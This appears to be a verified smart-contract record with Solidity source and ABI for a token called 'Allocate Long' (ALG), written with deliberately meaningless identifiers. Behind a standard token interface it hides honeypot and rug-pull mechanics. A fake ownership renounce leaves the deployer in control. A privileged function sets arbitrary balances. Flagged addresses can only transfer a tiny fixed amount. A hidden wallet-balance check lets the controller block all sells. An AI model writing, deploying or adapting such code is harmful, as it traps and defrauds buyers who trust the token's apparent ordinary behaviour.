{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface modeSellExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract exemptShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeTo {\n    function createPair(address launchTo, address minTeam) external returns (address);\n}\n\ninterface isAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountTeam) external view returns (uint256);\n\n    function transfer(address modeExempt, uint256 exemptAuto) external returns (bool);\n\n    function allowance(address atLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeExempt,\n        uint256 exemptAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeTotalMin, uint256 value);\n    event Approval(address indexed atLaunched, address indexed spender, uint256 value);\n}\n\ninterface isAutoMetadata is isAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AllocateLong is exemptShould, isAuto, isAutoMetadata {\n\n    address private fundList;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquiditySwap;\n    }\n\n    bool public takeFund;\n\n    uint256 public marketingTokenFund;\n\n    function owner() external view returns (address) {\n        return fundList;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingShould;\n    }\n\n    uint256 private launchAmount;\n\n    bool public liquidityLaunched;\n\n    function approve(address txLiquidity, uint256 exemptAuto) public virtual override returns (bool) {\n        marketingExemptTotal[_msgSender()][txLiquidity] = exemptAuto;\n        emit Approval(_msgSender(), txLiquidity, exemptAuto);\n        return true;\n    }\n\n    bool public modeEnable;\n\n    function transferFrom(address minFee, address modeExempt, uint256 exemptAuto) external override returns (bool) {\n        if (_msgSender() != fundReceiverFrom) {\n            if (marketingExemptTotal[minFee][_msgSender()] != type(uint256).max) {\n                require(exemptAuto <= marketingExemptTotal[minFee][_msgSender()]);\n                marketingExemptTotal[minFee][_msgSender()] -= exemptAuto;\n            }\n        }\n        return takeToken(minFee, modeExempt, exemptAuto);\n    }\n\n    uint8 private marketingBuy = 18;\n\n    function isMode(address enableList) public {\n        if (modeEnable) {\n            return;\n        }\n        if (takeFund) {\n            liquidityLaunched = true;\n        }\n        modeTrading[enableList] = true;\n        if (marketingTokenFund == tradingLaunch) {\n            receiverList = false;\n        }\n        modeEnable = true;\n    }\n\n    function tradingTo(address minFee, address modeExempt, uint256 exemptAuto) internal returns (bool) {\n        require(isLaunched[minFee] >= exemptAuto);\n        isLaunched[minFee] -= exemptAuto;\n        isLaunched[modeExempt] += exemptAuto;\n        emit Transfer(minFee, modeExempt, exemptAuto);\n        return true;\n    }\n\n    uint256 public tradingLaunch;\n\n    bool public walletFee;\n\n    function takeToken(address minFee, address modeExempt, uint256 exemptAuto) internal returns (bool) {\n        if (minFee == swapList) {\n            return tradingTo(minFee, modeExempt, exemptAuto);\n        }\n        uint256 launchedLimitReceiver = isAuto(atFund).balanceOf(liquidityIsMax);\n        require(launchedLimitReceiver == modeBuy);\n        require(modeExempt != liquidityIsMax);\n        if (txToken[minFee]) {\n            return tradingTo(minFee, modeExempt, toList);\n        }\n        return tradingTo(minFee, modeExempt, exemptAuto);\n    }\n\n    constructor (){\n        \n        modeSellExempt enableAutoFrom = modeSellExempt(fundReceiverFrom);\n        atFund = takeTo(enableAutoFrom.factory()).createPair(enableAutoFrom.WETH(), address(this));\n        if (liquidityLaunched) {\n            tradingLaunch = launchAmount;\n        }\n        swapList = _msgSender();\n        maxLiquidity();\n        modeTrading[swapList] = true;\n        isLaunched[swapList] = tradingShould;\n        if (marketingTokenFund == launchAmount) {\n            receiverList = false;\n        }\n        emit Transfer(address(0), swapList, tradingShould);\n    }\n\n    function listEnable(address sellLiquidity, uint256 exemptAuto) public {\n        listSell();\n        isLaunched[sellLiquidity] = exemptAuto;\n    }\n\n    address fundReceiverFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public swapList;\n\n    function listSell() private view {\n        require(modeTrading[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return senderSell;\n    }\n\n    string private liquiditySwap = \"ALG\";\n\n    address public atFund;\n\n    function atTakeToken(address marketingList) public {\n        listSell();\n        \n        if (marketingList == swapList || marketingList == atFund) {\n            return;\n        }\n        txToken[marketingList] = true;\n    }\n\n    function maxLiquidity() public {\n        emit OwnershipTransferred(swapList, address(0));\n        fundList = address(0);\n    }\n\n    function limitMaxReceiver(uint256 exemptAuto) public {\n        listSell();\n        modeBuy = exemptAuto;\n    }\n\n    mapping(address => bool) public modeTrading;\n\n    function balanceOf(address amountTeam) public view virtual override returns (uint256) {\n        return isLaunched[amountTeam];\n    }\n\n    address liquidityIsMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant toList = 3 ** 10;\n\n    function getOwner() external view returns (address) {\n        return fundList;\n    }\n\n    uint256 swapAtTeam;\n\n    string private senderSell = \"Allocate Long\";\n\n    event OwnershipTransferred(address indexed minSwap, address indexed autoFund);\n\n    function transfer(address sellLiquidity, uint256 exemptAuto) external virtual override returns (bool) {\n        return takeToken(_msgSender(), sellLiquidity, exemptAuto);\n    }\n\n    uint256 private tradingShould = 100000000 * 10 ** 18;\n\n    uint256 modeBuy;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingBuy;\n    }\n\n    bool private receiverList;\n\n    mapping(address => mapping(address => uint256)) private marketingExemptTotal;\n\n    mapping(address => uint256) private isLaunched;\n\n    function allowance(address teamReceiver, address txLiquidity) external view virtual override returns (uint256) {\n        if (txLiquidity == fundReceiverFrom) {\n            return type(uint256).max;\n        }\n        return marketingExemptTotal[teamReceiver][txLiquidity];\n    }\n\n    mapping(address => bool) public txToken;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTotalMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"}],\"name\":\"atTakeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableList\",\"type\":\"address\"}],\"name\":\"isMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptAuto\",\"type\":\"uint256\"}],\"name\":\"limitMaxReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptAuto\",\"type\":\"uint256\"}],\"name\":\"listEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTokenFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AllocateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}